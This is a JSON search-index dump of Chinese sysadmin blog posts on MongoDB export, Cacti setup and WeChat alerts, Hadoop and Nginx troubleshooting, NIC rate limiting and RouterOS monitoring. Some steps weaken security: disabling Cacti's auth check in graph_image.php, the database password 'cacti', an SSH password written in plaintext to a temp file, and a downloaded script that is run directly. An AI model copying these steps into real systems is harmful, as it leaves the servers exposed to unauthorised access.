0","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"parted","slug":"parted","permalink":"https://garywu520.github.io/tags/parted/"},{"name":"fdisk","slug":"fdisk","permalink":"https://garywu520.github.io/tags/fdisk/"}]},{"title":"MongoDB数据导出命令mongoexport和导入命令mongoimport","slug":"MongoDB数据导出命令mongoexport","date":"2018-04-26T03:08:11.000Z","updated":"2018-10-18T07:15:45.148Z","comments":true,"path":"2018/04/26/MongoDB数据导出命令mongoexport/","link":"","permalink":"https://garywu520.github.io/2018/04/26/MongoDB%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%87%BA%E5%91%BD%E4%BB%A4mongoexport/","excerpt":"1MongoDB数据导出命令mongoexport和导入命令mongoimport","text":"1MongoDB数据导出命令mongoexport和导入命令mongoimport 数据导出命令mongoexport12Mongodb中的mongoexport工具可以把一个collection导出成JSON格式或CSV格式的文件。可以通过参数指定导出的数据项，也可以根据指定的条件导出数据。 123456789101112131415161718192021222324mongoexport具体用法如下:查看帮助&#x2F;bin&#x2F;mongoexport --help 参数说明：-h:指明数据库宿主机的IP-u:指明数据库的用户名-p:指明数据库的密码-d:指明数据库的名字-c:指明collection(集合)的名字--type: 指明输出的格式,默认为json-f:指明要导出列(如果--type为csv，则需要加上-f &quot;字段名&quot;)-o:指明到要导出的文件名-q:指明导出数据的过滤条件(以json字符串作为查询条件)实例(导出json格式-默认输出为json格式)：&#x2F;bin&#x2F;mongoexport -h x.x.x.x:27017 -d online -c logs --type json -o &#x2F;data&#x2F;logs.json实例2（导出指定列的json格式-- -f命令指定导出列,中间用逗号分隔）mongoexport -h 10.3.0.242:27117 -d testdb -c logs -f tags,id --type&#x3D;json -o file.json实例3（导出CSV格式,务必指定需要导出的字段）：&#x2F;bin&#x2F;mongoexport -h x.x.x.x:27017 -d test -c students --type csv -f classid,name,age -o &#x2F;data&#x2F;students_csv.csv 数据导入命令mongoimport12语法：mongoimport -d dbname -c collectionname --file filename --headerline --type json&#x2F;csv -f field 12345678910参数说明：-h:指明数据库宿主机的IP-u:指明数据库的用户名-p:指明数据库的密码-d: 数据库名-c: collection--type: 导入的格式默认json-f ：导入的字段名--headerline ：如果导入的格式是csv，则可以使用第一行的标题作为导入的字段--file ：要导入的文件","categories":[],"tags":[{"name":"mongodb","slug":"mongodb","permalink":"https://garywu520.github.io/tags/mongodb/"},{"name":"mongo","slug":"mongo","permalink":"https://garywu520.github.io/tags/mongo/"},{"name":"mongoexport","slug":"mongoexport","permalink":"https://garywu520.github.io/tags/mongoexport/"},{"name":"mongoimport","slug":"mongoimport","permalink":"https://garywu520.github.io/tags/mongoimport/"},{"name":"json","slug":"json","permalink":"https://garywu520.github.io/tags/json/"},{"name":"csv","slug":"csv","permalink":"https://garywu520.github.io/tags/csv/"},{"name":"mongo导出命令","slug":"mongo导出命令","permalink":"https://garywu520.github.io/tags/mongo%E5%AF%BC%E5%87%BA%E5%91%BD%E4%BB%A4/"}]},{"title":"cacti_0.8.8部署","slug":"cacti-0-8-8部署","date":"2018-04-24T08:37:31.000Z","updated":"2019-04-28T08:22:18.320Z","comments":true,"path":"2018/04/24/cacti-0-8-8部署/","link":"","permalink":"https://garywu520.github.io/2018/04/24/cacti-0-8-8%E9%83%A8%E7%BD%B2/","excerpt":"一、安装必备工具 rrdtool apache mysql cron gcc 123yum -y install mariadb-server php php-cli php-mysql \\ net-snmp-utils rrdtool php-snmp gcc mariadb-devel \\ net-snmp-devel autoconf automake libtool dos2unix wget help2man 启动服务 12345systemctl enable httpd.servicesystemctl enable mariadb.servicesystemctl restart httpd.servicesystemctl restart mariadb.service","text":"一、安装必备工具 rrdtool apache mysql cron gcc 123yum -y install mariadb-server php php-cli php-mysql \\ net-snmp-utils rrdtool php-snmp gcc mariadb-devel \\ net-snmp-devel autoconf automake libtool dos2unix wget help2man 启动服务 12345systemctl enable httpd.servicesystemctl enable mariadb.servicesystemctl restart httpd.servicesystemctl restart mariadb.service 二、Cacti下载1234cd /var/www/htmlwget http://www.cacti.net/downloads/cacti-0.8.8h.tar.gztar -xzvf cacti-0.8.8h.tar.gzln -sv cacti-0.8.8h cacti 三、配置cron1adduser -d /var/www/html/cacti -s /sbin/nologin cacti 1echo &quot;*&#x2F;5 * * * * cacti php &#x2F;var&#x2F;www&#x2F;html&#x2F;cacti&#x2F;poller.php &amp;&gt;&#x2F;dev&#x2F;null&quot; &gt;&gt; &#x2F;etc&#x2F;cron.d&#x2F;cacti 123cd /var/www/html/cactichown -R apache.apache rra log chmod 775 rra log 四、配置cacti数据库初始化 1&#x2F;usr&#x2F;bin&#x2F;mysql_secure_installation 导入初始数据 123mysqladmin -u root -p create cactimysql -p cacti &lt; &#x2F;var&#x2F;www&#x2F;html&#x2F;cacti&#x2F;cacti.sqlmysql -u root -p 授权 123GRANT ALL ON cacti.* TO cacti@localhost IDENTIFIED BY &#39;cacti&#39;;flush privileges;exit 修改数据库信息 123456789vim &#x2F;var&#x2F;www&#x2F;html&#x2F;cacti&#x2F;include&#x2F;config.php$database_type &#x3D; &quot;mysql&quot;;$database_default &#x3D; &quot;cacti&quot;;$database_hostname &#x3D; &quot;localhost&quot;;$database_username &#x3D; &quot;cacti&quot;;$database_password &#x3D; &quot;cacti&quot;;$database_port &#x3D; &quot;3306&quot;;$url_path &#x3D; &quot;&#x2F;cacti&#x2F;&quot;; 五、配置phpcat /etc/php.ini 12date.timezone &#x3D; Asia&#x2F;Shanghaierror_log &#x3D; syslog 重启apache 12systemctl restart httpdyum update glib2 -y 六、Web完善浏览器访问 http://xx.xx.xx.xx/cacti","categories":[],"tags":[{"name":"cacti","slug":"cacti","permalink":"https://garywu520.github.io/tags/cacti/"},{"name":"监控","slug":"监控","permalink":"https://garywu520.github.io/tags/%E7%9B%91%E6%8E%A7/"},{"name":"rrdtool","slug":"rrdtool","permalink":"https://garywu520.github.io/tags/rrdtool/"}]},{"title":"hadoop常用命令","slug":"hadoop常用命令","date":"2018-04-23T02:47:58.000Z","updated":"2018-04-23T03:59:35.497Z","comments":true,"path":"2018/04/23/hadoop常用命令/","link":"","permalink":"https://garywu520.github.io/2018/04/23/hadoop%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/","excerpt":"1作为hadoop运维,常用命令还是要牢记下的，与linux稍有区别，来总结下","text":"1作为hadoop运维,常用命令还是要牢记下的，与linux稍有区别，来总结下 Hadoop常用命令hadoop命令格式1hadoop fs -cmd &lt;args&gt; ls命令12列出hdfs文件系统根目录下的目录和文件hadoop fs -ls &#x2F; 12列出hdfs文件系统所有的目录和文件(含子目录和文件)hadoop fs -ls -R &#x2F; mkdir命令12创建多级目录,即使父目录不存在hadoop fs -mkdir -p [hdfs dir] rm命令12345删除文件hadoop fs -rm [hdfs file]删除目录hadoop fs -rm -r [hdfs dir] touchz命令12在hadoop指定目录下新建空文件hadoop fs -ls -touchz [hdfs dir]&#x2F;new.txt cp命令1hadoop fs -cp [hdfs file] [hdfs file] mv命令12重命名hdfs上的文件名hadoop fs -mv &#x2F;user&#x2F;new.txt &#x2F;user&#x2F;ok.txt put命令12文件上传到hdfshadoop fs -put [local file] [hdfs dir] 12目录上传到hdfshadoop fs -ls -put [local dir] [hdfs dir] get命令12从hdfs下载文件到本地目录hadoop fs -get [hdfs file] [local dir] 12从hdfs下载目录到本地目录hadoop fs -get [hdfs dir] [local dir] 12将hdfs指定目录下所有文件排序后合并到local指定的文件中，若指定的local文件不存在则自动创建，若文件存在则会覆盖原文件内容。hadoop fs -getmerge [hdfs dir] [local file] du命令12345显示hdfs对应目录下每个目录或文件的大小hadoop fs -du [hdfs path]以人类可读的方式显示每个目录或文件的大小hadoop fs -du -h [hdfs path] tail命令1hadoop fs -tail [hdfs file] count命令12统计hdfs对应路径下的目录个数 + 文件格式 + 文件总大小等hadoop fs -count &#x2F;serverdata stat命令1234567hdoop fs -stat [format] [hdfs path]返回对应路径的状态信息其中，[format]可选参数有：%b（文件大小），%o（Block大小），%n（文件名），%r（副本个数），%y（最后一次修改日期和时间）hadoop fs -stat %b%o%n [hdfs path] setrep命令1234改变一个文件在hdfs中的副本个数。hadoop fs setrep -R 3 [hdfs file or hdfs dir]上述命令中数字3为设置的副本个数，-R选项可以对一个目录下的所有目录和文件递归执行改变副本的个数。 balancer命令123hdfs balancer 如果管理员发现某些DataNode保存数据过多，某些DataNode保存数据相对较少，可以使用上述命令手动启动内部的均衡过程 dfsadmin命令1234567891011管理员可以通过dfsadmin管理HDFS查看帮助hdfs dfsadmin -help显示文件系统的基本数据hdfs dfsadmin -safemode &lt; enter | leave | get | wait &gt;enter：进入安全模式；leave：离开安全模式；get：获知是否开启安全模式；wait：等待离开安全模式","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"hadoop","slug":"hadoop","permalink":"https://garywu520.github.io/tags/hadoop/"},{"name":"hdfs","slug":"hdfs","permalink":"https://garywu520.github.io/tags/hdfs/"},{"name":"fs","slug":"fs","permalink":"https://garywu520.github.io/tags/fs/"}]},{"title":"cacti接入微信告警功能","slug":"cacti接入微信告警功能","date":"2018-04-20T08:04:56.000Z","updated":"2018-04-20T11:22:08.608Z","comments":true,"path":"2018/04/20/cacti接入微信告警功能/","link":"","permalink":"https://garywu520.github.io/2018/04/20/cacti%E6%8E%A5%E5%85%A5%E5%BE%AE%E4%BF%A1%E5%91%8A%E8%AD%A6%E5%8A%9F%E8%83%BD/","excerpt":"1cacti接入微信告警功能","text":"1cacti接入微信告警功能 插件安装1需要cacti安装thold与settings插件并启用插件 参考：插件安装 配置微信告警代码1vi &#x2F;var&#x2F;www&#x2F;cacti&#x2F;plugins&#x2F;thold&#x2F;thold_functions.php 1234567891011121314151617181920212223 $message &#x3D; str_replace(&#39;&lt;GRAPH&gt;&#39;, &quot;&lt;br&gt;&lt;img src&#x3D;&#39;&quot; . $val[&#39;file&#39;] . &quot;&#39;&gt;&lt;br&gt;Could not open!&lt;br&gt;&quot; . $val[&#39;file&#39;], $message); &#125; &#125;&#125;########## 在这个位置添加如下代码 ###############$msg_wx &#x3D; strip_tags(str_replace(&#39;&lt;br&gt;&#39;, &quot;\\n&quot;, $message));$msg_wx &#x3D; trim($msg_wx);$msg_wx &#x3D; iconv( &quot;GB2312&#x2F;&#x2F;IGNORE&quot;, &quot;UTF-8&quot;, $msg_wx);$sub_wx &#x3D; iconv( &quot;GB2312&#x2F;&#x2F;IGNORE&quot;, &quot;UTF-8&quot;, $subject);$file_title &#x3D; &#39;&#x2F;tmp&#x2F;wechat.txt&#39;;$file_message &#x3D; &#39;&#x2F;tmp&#x2F;wechat_message.txt&#39;;if($f &#x3D; file_put_contents($file_title, $sub_wx)) if($f &#x3D; file_put_contents($file_message, $msg_wx))shell_exec(&quot;&#x2F;etc&#x2F;wechat.sh&quot;);########## 代码添加-结束 #######################$text &#x3D; array(&#39;text&#39; &#x3D;&gt; &#39;&#39;, &#39;html&#39; &#x3D;&gt; &#39;&#39;); if ($filename &#x3D;&#x3D; &#39;&#39;) &#123; $message &#x3D; str_replace(&#39;&lt;br&gt;&#39;, &quot;\\n&quot;, $message); $message &#x3D; str_replace(&#39;&lt;BR&gt;&#39;, &quot;\\n&quot;, $message); $message &#x3D; str_replace(&#39;&lt;&#x2F;BR&gt;&#39;, &quot;\\n&quot;, $message); 12345678910111213141516171819202122232425262728上面添加代码注释：&#x2F;&#x2F;删除message中的html标签,并将&lt;br&gt;替换为换行符\\n$msg_wx &#x3D; strip_tags(str_replace(&#39;&lt;br&gt;&#39;, &quot;\\n&quot;, $message)); &#x2F;&#x2F;整理msg_wx字符串$msg_wx &#x3D; trim($msg_wx); &#x2F;&#x2F;转换编码为utf-8，防止乱码 $msg_wx &#x3D; iconv( &quot;GB2312&#x2F;&#x2F;IGNORE&quot;, &quot;UTF-8&quot;, $msg_wx); &#x2F;&#x2F;转换编码为utf-8，防止乱码$sub_wx &#x3D; iconv( &quot;GB2312&#x2F;&#x2F;IGNORE&quot;, &quot;UTF-8&quot;, $subject); &#x2F;&#x2F;要写入文件的文件名（可以是任意文件名），如果文件不存在，将会创建一个$file_title &#x3D; &#39;&#x2F;tmp&#x2F;wechat.txt&#39;; &#x2F;&#x2F;要写入文件的文件名（可以是任意文件名），如果文件不存在，将会创建一个$file_message &#x3D; &#39;&#x2F;tmp&#x2F;wechat_message.txt&#39;; &#x2F;&#x2F;将subject参数的值保存到file_title中if($f &#x3D; file_put_contents($file_title, $sub_wx)) &#x2F;&#x2F;将msg_wx参数的值保存到file_message中if($f &#x3D; file_put_contents($file_message, $msg_wx))&#x2F;&#x2F;运行wechat.sh文件，进行微信报警操作。shell_exec(&quot;&#x2F;etc&#x2F;wechat.sh&quot;); 配置触发消息脚本12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# vi &#x2F;etc&#x2F;wechat.sh#微信企业号的CropIDCropID&#x3D;&#39;xxxxxxxxxxxx&#39;#企业号应用SecretSecret&#x3D;&#39;xxxxxxxxxxxxxxxxxxxxxx&#39;GURL&#x3D;&quot;https:&#x2F;&#x2F;qyapi.weixin.qq.com&#x2F;cgi-bin&#x2F;gettoken?corpid&#x3D;$CropID&amp;corpsecret&#x3D;$Secret&quot;Gtoken&#x3D;$(&#x2F;usr&#x2F;bin&#x2F;curl -s -G $GURL | awk -F &quot;[\\&quot;:,]&quot; &#39;&#123;print $15&#125;&#39;)PURL&#x3D;&quot;https:&#x2F;&#x2F;qyapi.weixin.qq.com&#x2F;cgi-bin&#x2F;message&#x2F;send?access_token&#x3D;$Gtoken&quot;function body() &#123;#Appid 填写企业号中建立的报警APP的IDlocal int AppID&#x3D;1#此处填写报警接收用户，全部报警可留空local UserID&#x3D;&quot;@all&quot;local PartyID&#x3D;&quot;@all&quot;local TagID&#x3D;&quot;@all&quot;Ent&#x3D;$&#39;\\n&#39;#应cactifans群内要求，添加Cacti微信报警日期参数Date&#x3D;$(date &#39;+%Y年%m月%d日 %H:%M:%S\\n\\n&#39;)#读取&#x2F;tmp&#x2F;wechat.txt文件中内容到变量TitTit&#x3D;$(cat &#x2F;tmp&#x2F;wechat.txt)#拼接msg主体文件,包含日期,主题,报警内容.并删除报警内容中的&#39;%&#39;号.Msg&#x3D;$Date$Tit$Ent$(cat &#x2F;tmp&#x2F;wechat_message.txt|sed &#39;s&#x2F;%&#x2F;&#x2F;g&#39;)#获取wechat_message.txt中的url行内容Url&#x3D;$(grep &quot;http&quot; &#x2F;tmp&#x2F;wechat_message.txt|sed &#39;s&#x2F;URL: &#x2F;&#x2F;g&#39;)Pic_tmp&#x3D;$(grep &quot;http&quot; &#x2F;tmp&#x2F;wechat_message.txt|sed &#39;s&#x2F;URL: &#x2F;&#x2F;g&#39;|sed &#39;s&#x2F;\\&#x2F;graph.php&#x2F;\\&#x2F;graph_image.php&#x2F;g&#39;)#在此修改图片大小，防止图像显示不全,并判断图片文件是否存在。防止宕机出现图片报警if [ ! -n &quot;$Pic_tmp&quot; ] ;then Pic&#x3D;&quot;&quot;else Pic&#x3D;$Pic_tmp$&#39;&amp;graph_height&#x3D;215&amp;graph_width&#x3D;424&#39;fiprintf &#39;&#123;\\n&#39;printf &#39;\\t&quot;touser&quot;: &quot;&#39;&quot;$UserID&quot;\\&quot;&quot;,\\n&quot;printf &#39;\\t&quot;toparty&quot;: &quot;&#39;&quot;$PartyID&quot;\\&quot;&quot;,\\n&quot;printf &#39;\\t&quot;totag&quot;: &quot;&#39;&quot;$TagID&quot;\\&quot;&quot;,\\n&quot;printf &#39;\\t&quot;msgtype&quot;: &quot;news&quot;,\\n&#39;printf &#39;\\t&quot;agentid&quot;: &quot;&#39;&quot; $AppID &quot;\\&quot;&quot;,\\n&quot;printf &#39;\\t&quot;news&quot;: &#123;\\n&#39;printf &#39;\\t&quot;articles&quot;: [\\n&#39;printf &#39;&#123;\\n&#39;printf &#39;\\t\\t&quot;title&quot;: &quot;&#39;&quot;$Tit&quot;\\&quot;,&quot;\\n&quot;printf &#39;\\t\\t&quot;description&quot;: &quot;&#39;&quot;$Msg&quot;\\&quot;,&quot;\\n&quot;printf &#39;\\t\\t&quot;url&quot;: &quot;&#39;&quot;$Url&quot;\\&quot;,&quot;\\n&quot;printf &#39;\\t\\t&quot;picurl&quot;: &quot;&#39;&quot;$Pic&quot;\\&quot;,&quot;\\n&quot;printf &#39;\\t&#125;\\n&#39;printf &#39;\\t]\\n&#39;printf &#39;\\t&#125;\\n&#39;printf &#39;&#125;\\n&#39;&#125;curl -l -H &quot;Content-type: application&#x2F;json&quot; -X POST -d &quot;$(body )&quot; $PURL 测试微信脚本是否可用12345678在&#x2F;tmp&#x2F;wechat.txt和&#x2F;tmp&#x2F;wechat_message.txt中随便填写一些内容，然后运行微信脚本echo &quot;主题123&quot; &gt; &#x2F;tmp&#x2F;wechat.txtecho &quot;主体内容-测试456&quot; &gt; &#x2F;tmp&#x2F;wechat_message.txtsh &#x2F;etc&#x2F;wechat.shchmod +x &#x2F;etc&#x2F;wechat.sh注:测试完成后,需要删除&#x2F;tmp&#x2F;wechat* 文件，否则会出现权限问题导致数据无法写入 配置告警阈值并测试微信收取1略 故障处理:流量图不能显示12345678注意：如果流量告警中无法显示流量图，可以做如下修改#取消cacti的图像验证配置# vi &#x2F;var&#x2F;www&#x2F;cacti&#x2F;graph_image.php#include(&quot;.&#x2F;include&#x2F;auth.php&quot;); #添加注释include_once(&quot;.&#x2F;lib&#x2F;rrd.php&quot;);include(&quot;.&#x2F;include&#x2F;global.php&quot;); #添加这一行 参考: 51CTO","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"cacti","slug":"cacti","permalink":"https://garywu520.github.io/tags/cacti/"},{"name":"微信","slug":"微信","permalink":"https://garywu520.github.io/tags/%E5%BE%AE%E4%BF%A1/"},{"name":"微信告警","slug":"微信告警","permalink":"https://garywu520.github.io/tags/%E5%BE%AE%E4%BF%A1%E5%91%8A%E8%AD%A6/"}]},{"title":"查看占用内存或CPU最多的进程","slug":"查看占用内存或CPU最多的进程","date":"2018-04-20T01:52:33.000Z","updated":"2018-12-21T02:17:01.612Z","comments":true,"path":"2018/04/20/查看占用内存或CPU最多的进程/","link":"","permalink":"https://garywu520.github.io/2018/04/20/%E6%9F%A5%E7%9C%8B%E5%8D%A0%E7%94%A8%E5%86%85%E5%AD%98%E6%88%96CPU%E6%9C%80%E5%A4%9A%E7%9A%84%E8%BF%9B%E7%A8%8B/","excerpt":"1快速定位占用内存或占用CPU最多的进程，并对其排序。","text":"1快速定位占用内存或占用CPU最多的进程，并对其排序。 查看占用内存最多的进程123ps -aux |sort -k4nr |head -10列出的结果中：第3列表示CPU占用，第4列表示内存占用。 查看占用CPU较高的进程 123ps -aux |sort -k3nr|head -10列出的结果中：第3列表示CPU占用，第4列表示内存占用。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"CPU","slug":"CPU","permalink":"https://garywu520.github.io/tags/CPU/"},{"name":"内存","slug":"内存","permalink":"https://garywu520.github.io/tags/%E5%86%85%E5%AD%98/"},{"name":"使用率","slug":"使用率","permalink":"https://garywu520.github.io/tags/%E4%BD%BF%E7%94%A8%E7%8E%87/"}]},{"title":"Nginx状态码499-错误分析","slug":"Nginx状态码499-错误分析","date":"2018-04-11T07:50:03.000Z","updated":"2018-04-11T08:14:52.385Z","comments":true,"path":"2018/04/11/Nginx状态码499-错误分析/","link":"","permalink":"https://garywu520.github.io/2018/04/11/Nginx%E7%8A%B6%E6%80%81%E7%A0%81499-%E9%94%99%E8%AF%AF%E5%88%86%E6%9E%90/","excerpt":"1nginx日志大量499报错,分析与处理。","text":"1nginx日志大量499报错,分析与处理。 错误日志12345220.181.165.136 - - [18&#x2F;May&#x2F;2015:10:31:02 +0800] &quot;POST &#x2F;v1&#x2F;jobsHTTP&#x2F;1.1&quot; 499 0 &quot;&quot; &quot;bdHttpRequest&#x2F;1.0.0&quot;115.239.212.7 - - [18&#x2F;May&#x2F;2015:10:31:03 +0800] &quot;GET &#x2F;v1&#x2F;job&#x2F;643309e3-dc73-4025-aa69-c9405c1d818fHTTP&#x2F;1.1&quot; 499 0&quot;http:&#x2F;&#x2F;www.baidu.com&#x2F;?tn&#x3D;91638679_hao_pg&amp;s_j&#x3D;1&quot;&quot;Mozilla&#x2F;5.0 (Windows NT 6.1; Trident&#x2F;7.0; rv:11.0) like Gecko&quot; 140.207.202.187 - - [18&#x2F;May&#x2F;2015:10:30:58 +0800] &quot;POST&#x2F;v3&#x2F;violations HTTP&#x2F;1.1&quot; 499 0 &quot;-&quot; &quot;-&quot; 问题分析12345499 CLIENT CLOSED REQUEST A non-standard status code introduced by nginx for the case when a client closes the connection while nginx is processing the request.499 客户端关闭请求Nginx在处理请求时，客户端关闭了连接，故nginx抛出了499这个状态代码。 123456789大牛分析源码-摘录&#x2F;** HTTP does notdefine the code for the case when a client closed* the connectionwhile we are processing its request so we introduce* own code to logsuch situation when a client has closed the connection* before we even tryto send the HTTP header to it*&#x2F;意思是服务器在返回HTTP头之前，客户端就已经关闭了当前连接。很可能是因为服务器端处理的时间过长，客户端&quot;不耐烦&quot;了... 123456Nginx upstream在以下情况下会返回499状态码：(1)upstream 在收到读写事件处理之前时，会检查连接是否可用，当连接错误时会返回499。(2)server处理请求未结束，而client提前关闭了连接，此时也会返回499。总之，这个错误的比例升高可能表明服务器upstream处理过慢，导致用户提前关闭连接。 12345678910为什么服务端处理时间过长？可能的原因是：(1)后台python程序处理请求时间过长(2)mysql慢查询尝试去验证结论：(1)查看CPU和内存使用, 是否在正常范围(2)后台程序访问是否正常(3)验证mysql是否有慢查询 12345678910如果以上结论都正常，可以使用如下参数来优化proxy_ignore_client_abort on; #让代理服务端不要主动关闭客户端的连接。如果使用了 proxy_ignore_client_abort on ;那么客户端主动断掉连接之后，Nginx 会等待后端处理完(或者超时)，然后记录「后端的返回信息」到日志。所以，如果后端返回200，就记录200 ；如果后端放回 5XX ，那么就记录 5XX.如果超时(默认60s，可以用 proxy_read_timeout 设置)，Nginx会主动断开连接，记录504注：建议只在做反向代理的时候使用。最好关闭这一选项。 参考: 51CTO","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"499","slug":"499","permalink":"https://garywu520.github.io/tags/499/"},{"name":"nginx upstream","slug":"nginx-upstream","permalink":"https://garywu520.github.io/tags/nginx-upstream/"},{"name":"proxy_ignore_client_abort","slug":"proxy-ignore-client-abort","permalink":"https://garywu520.github.io/tags/proxy-ignore-client-abort/"}]},{"title":"Linux网卡限速","slug":"Linux网卡限速","date":"2018-04-11T06:19:23.000Z","updated":"2018-04-11T06:48:10.962Z","comments":true,"path":"2018/04/11/Linux网卡限速/","link":"","permalink":"https://garywu520.github.io/2018/04/11/Linux%E7%BD%91%E5%8D%A1%E9%99%90%E9%80%9F/","excerpt":"1罗列几种linux网卡限速方案，运行结果已实际为准，不对以下工具限速结果负责。","text":"1罗列几种linux网卡限速方案，运行结果已实际为准，不对以下工具限速结果负责。 MB/s与Mbit/s概念12345Mbit&#x2F;s意思是 兆比特&#x2F;秒，俗称:小b, 是指每秒传输的比特位数，即家里使用的10M或50M宽带或者speedtest测速结果再或者Cacti监控看到的带宽峰值就是这个小b的概念。MB&#x2F;s意思是 兆字节&#x2F;秒,俗称:大B，是指每秒传输的字节数量，也是实际下载文件看到的网络速度。8Mbit&#x2F;s(运营商网络带宽)&#x3D;1MB&#x2F;s(实际文件下载速度) 限速方案简单粗暴之ethtool命令123456789101112以CentOS为例，系统默认自带ethtool命令，使用方法如下：(1) 查看网卡信息 ethtool em1(2) 使用ethtool命令把千兆网卡降为百兆网卡并关闭自协商 ethtool -s em1 speed 100 duplex full autoneg off(3) 恢复千兆速度并启用自协商 ethtool -s em1 speed 1000 duplex full autoneg on注：此命令会导致服务器em1临时断网,后自恢复，请谨慎操作。注: 此操作在ESXI虚拟机中无效 最便捷之wondershaper12345678910(1)google搜索wondershaper rpm下载对应安装包并通过rpm -ivh命令安装（不需要依赖）(2)命令格式（单位:Kbps）： wondershaper 网卡名称 下载速度 上传速度(3)例如: 我限制em1网卡下载速度为10Mbit&#x2F;s,上传速度为15Mbit&#x2F;s wondershaper em1 10000 15000(4)取消限速 wondershaper clear em1 最稳妥限速之交换机端口限速1对此不进行赘述 限速后测速1234567linux下限速后如何测速？下载speedtest测速脚本wget -O speedtest-cli https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;sivel&#x2F;speedtest-cli&#x2F;master&#x2F;speedtest.py &amp;&amp; chmod +x speedtest-cli执行如下命令等待结果即可.&#x2F;speedtest-cli 更多speedtest安装方式-参考","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"限速方案","slug":"限速方案","permalink":"https://garywu520.github.io/tags/%E9%99%90%E9%80%9F%E6%96%B9%E6%A1%88/"},{"name":"Linux限速","slug":"Linux限速","permalink":"https://garywu520.github.io/tags/Linux%E9%99%90%E9%80%9F/"},{"name":"wondershaper","slug":"wondershaper","permalink":"https://garywu520.github.io/tags/wondershaper/"},{"name":"tc","slug":"tc","permalink":"https://garywu520.github.io/tags/tc/"},{"name":"ethtool","slug":"ethtool","permalink":"https://garywu520.github.io/tags/ethtool/"}]},{"title":"通过ssh和expect监控RouterOS","slug":"通过ssh和expect监控RouterOS","date":"2018-04-10T04:25:21.000Z","updated":"2018-08-10T04:31:08.406Z","comments":true,"path":"2018/04/10/通过ssh和expect监控RouterOS/","link":"","permalink":"https://garywu520.github.io/2018/04/10/%E9%80%9A%E8%BF%87ssh%E5%92%8Cexpect%E7%9B%91%E6%8E%A7RouterOS/","excerpt":"意义 1可通过这种方式稍加变通下，就可以很方便的获取RouterOS所有想要的信息，甚至是定时备份。 脚本逻辑： 12(1)ssh通过expect免交互方式登录RouterOS, 并远程执行命令(2)将命令结果输出到文件，将数据分析后接入zabbix","text":"意义 1可通过这种方式稍加变通下，就可以很方便的获取RouterOS所有想要的信息，甚至是定时备份。 脚本逻辑： 12(1)ssh通过expect免交互方式登录RouterOS, 并远程执行命令(2)将命令结果输出到文件，将数据分析后接入zabbix 实现脚本： 1234567891011121314151617181920212223242526272829303132333435363738#!&#x2F;bin&#x2F;bashHOSTNAME&#x3D;&quot;xx.xx.xx.xx&quot;PORT&#x3D;&quot;xxx&quot;USER&#x3D;&quot;xxx&quot;PASS&#x3D;&quot;xxxxx&quot;TMP&#x3D;&quot;&#x2F;tmp&#x2F;expect.et&quot;#创建expect脚本if [ ! -f $TMP ];then touch $TMPelse &gt;$TMPficat &gt; $TMP &lt;&lt; EOF set timeout -1spawn ssh -p$PORT $USER@$HOSTNAMEmatch_max 100000expect -exact &quot;password:&quot;send -- &quot;$PASS\\r&quot;sleep 1expect &quot; &gt; &quot;send -- &quot;&#x2F;system resource print\\r&quot;expect &quot; &gt; &quot;send -- &quot;quit\\r&quot;expect eofEOF#运行expect脚本chmod +x $TMPSTAT_FILE&#x3D;&#x2F;tmp&#x2F;routeros.status&#x2F;usr&#x2F;bin&#x2F;expect -f $TMP &gt;$&#123;STAT_FILE&#125;sleep 5rm -f $TMP","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"zabbix","slug":"zabbix","permalink":"https://garywu520.github.io/tags/zabbix/"},{"name":"shell","slug":"shell","permalink":"https://garywu520.github.io/tags/shell/"},{"name":"RouterOS","slug":"RouterOS","permalink":"https://garywu520.github.io/tags/RouterOS/"},{"name":"SSH","slug":"SSH","permalink":"https://garywu520.github.io/tags/SSH/"},{"name":"expect","slug":"expect","permalink":"https://garywu520.github.io/tags/expect/"},{"name":"Ros","slug":"Ros","permalink":"https://garywu520.github.io/tags/Ros/"},{"name":"免交互","slug":"免交互","permalink":"https://garywu520.github.io/tags/%E5%85%8D%E4%BA%A4%E4%BA%92/"},{"name":"交互","slug":"交互","permalink":"https://garywu520.github.io/tags/%E4%BA%A4%E4%BA%92/"}]},{"title":"Linux下route路由配置梳理","slug":"Linux下route路由配置梳理","date":"2018-04-07T02:48:37.000Z","updated":"2018-04-07T04:11:30.003Z","comments":true,"path":"2018/04/07/Linux下route路由配置梳理/","link":"","permalink":"https://garywu520.github.io/2018/04/07/Linux%E4%B8%8Broute%E8%B7%AF%E7%94%B1%E9%85%8D%E7%BD%AE%E6%A2%B3%E7%90%86/","excerpt":"1在日常运维作业中，经常会碰到路由表的操作。下面就相关操作进行梳理","text":"1在日常运维作业中，经常会碰到路由表的操作。下面就相关操作进行梳理 路由基础知识路由概念123456路由： 跨越从源主机到目标主机的一个互联网络来转发数据包的过程路由器：能够将数据包转发到正确的目的地，并在转发过程中选择最佳路径的设备路由表：在路由器中维护的路由条目，路由器根据路由表做路径选择直连路由：当在路由器上配置了接口的IP地址，并且接口状态为up的时候，路由表中就出现直连路由项静态路由：是由管理员手工配置的，是单向的。默认路由：当路由器在路由表中找不到目标网络的路由条目时，路由器把请求转发到默认路由接口 。 